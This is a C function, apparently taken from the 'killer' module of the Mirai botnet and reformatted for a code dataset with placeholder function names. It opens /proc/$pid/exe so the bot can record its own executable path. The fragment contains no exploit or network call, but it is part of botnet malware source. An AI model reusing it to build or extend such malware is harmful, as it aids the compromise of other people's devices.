#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int PATH_MAX ; 
 int /*<<< orphan*/  TABLE_KILLER_EXE ; 
 int /*<<< orphan*/  TABLE_KILLER_PROC ; 
 int /*<<< orphan*/  TRUE ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 () ; 
 char* killer_realpath ; 
 int FUNC2 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (char*,...) ; 
 int FUNC4 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,int,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,int) ; 

__attribute__((used)) static BOOL FUNC11(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    FUNC7(TABLE_KILLER_PROC);
    FUNC7(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += FUNC9(ptr_path, FUNC6(TABLE_KILLER_PROC, NULL));
    ptr_path += FUNC9(ptr_path, FUNC8(FUNC1(), 10, tmp));
    ptr_path += FUNC9(ptr_path, FUNC6(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = FUNC2(path, O_RDONLY)) == -1)
    {
#ifdef DEBUG
        printf("[killer] Failed to open()\n");
#endif
        return FALSE;
    }
    FUNC0(fd);

    FUNC5(TABLE_KILLER_PROC);
    FUNC5(TABLE_KILLER_EXE);

    if ((k_rp_len = FUNC4(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
#ifdef DEBUG
        printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
#endif
    }

    FUNC10(path, ptr_path - path);

    return TRUE;
}